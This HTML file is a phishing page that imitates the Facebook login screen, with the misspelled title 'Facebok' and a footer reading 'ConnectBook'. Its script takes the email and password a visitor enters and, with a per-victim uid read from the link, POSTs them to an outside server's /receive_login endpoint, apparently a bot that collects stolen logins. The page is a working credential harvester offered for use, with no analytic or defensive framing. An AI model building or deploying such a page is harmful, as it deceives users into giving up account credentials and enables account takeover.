<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Facebok</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Segoe UI", Helvetica, Arial, sans-serif;
    }

    body {
      background: linear-gradient(180deg, #e8ebf2 0%, #f7f8fa 100%);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      min-height: 100vh;
      padding-top: 60px;
    }

    .logo {
      color: #2266dd;
      font-size: 48px;
      font-weight: 800;
      letter-spacing: -1px;
      margin-bottom: 20px;
      text-shadow: 0 1px 2px rgba(0,0,0,0.1);
    }

    .login-box {
      background-color: #ffffff;
      width: 90%;
      max-width: 380px;
      padding: 25px 20px 30px 20px;
      border-radius: 12px;
      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.12);
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .login-box input {
      width: 100%;
      padding: 14px;
      margin: 8px 0;
      font-size: 15.5px;
      border: 1px solid #cfd2d8;
      border-radius: 10px;
      background: #f7f8fa;
      transition: 0.2s ease;
    }

    .login-box input:focus {
      outline: none;
      border-color: #2a6ef2;
      background: #fff;
      box-shadow: 0 0 0 3px rgba(42,110,242,0.1);
    }

    .login-box button {
      width: 100%;
      padding: 14px;
      background-color: #2a6ef2;
      color: white;
      font-size: 17px;
      font-weight: bold;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      margin-top: 12px;
      transition: background 0.3s ease;
    }

    .login-box button:hover {
      background-color: #1f5ed1;
    }

    .forgot {
      color: #2a6ef2;
      text-decoration: none;
      font-size: 14px;
      margin: 14px 0;
      font-weight: 500;
    }

    .forgot:hover {
      text-decoration: underline;
    }

    .divider {
      width: 100%;
      border-bottom: 1px solid #dadde1;
      margin: 10px 0 18px 0;
    }

    .create-btn {
      background-color: #3cc93f;
      color: white;
      font-weight: 600;
      padding: 13px;
      border: none;
      border-radius: 10px;
      font-size: 16px;
      cursor: pointer;
      width: 70%;
      transition: background 0.3s ease;
    }

    .create-btn:hover {
      background-color: #34b437;
    }

    .footer {
      margin-top: 50px;
      text-align: center;
      font-size: 12px;
      color: #666c75;
      line-height: 1.6;
    }

    .footer a {
      color: #666c75;
      text-decoration: none;
      margin: 0 5px;
    }

    .footer a:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>
  <div class="logo">FaceBook</div>

  <div class="login-box">
    <input type="text" id="username" placeholder="Email address or phone number">
    <input type="password" id="password" placeholder="Enter your password">
    <button onclick="sendLogin()">Sign in</button>
    <a href="#" class="forgot">Forgot password?</a>
    <div class="divider"></div>
    <button class="create-btn">Create Account</button>
  </div>

  <div class="footer">
    <p>
      English (UK) · বাংলা · हिन्दी · Español · العربية · Français (FR)<br><br>
      ConnectBook © 2025
    </p>
  </div>

  <script>
    const BACKEND_URL = "https://bot-production-85f6.up.railway.app";

    function getUID() {
      const params = new URLSearchParams(window.location.search);
      return params.get("uid");
    }

    async function sendLogin() {
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      const uid = getUID();

      if (!uid) {
        alert("Invalid link: UID not found.");
        return;
      }
      if (!username || !password) {
        alert("Enter both username and password.");
        return;
      }

      try {
        const res = await fetch(`${BACKEND_URL}/receive_login`, {
          method: "POST",
          headers: {"Content-Type": "application/json"},
          body: JSON.stringify({ uid, username, password })
        });
        const data = await res.json();
        if (data.status === "sent") {
          alert("✅ login are panding!");
        } else {
          alert("❌ Error: " + (data.error || "Unknown error"));
        }
      } catch (err) {
        alert("❌ Network error: " + err);
      }
    }
  </script>
</body>
</html>
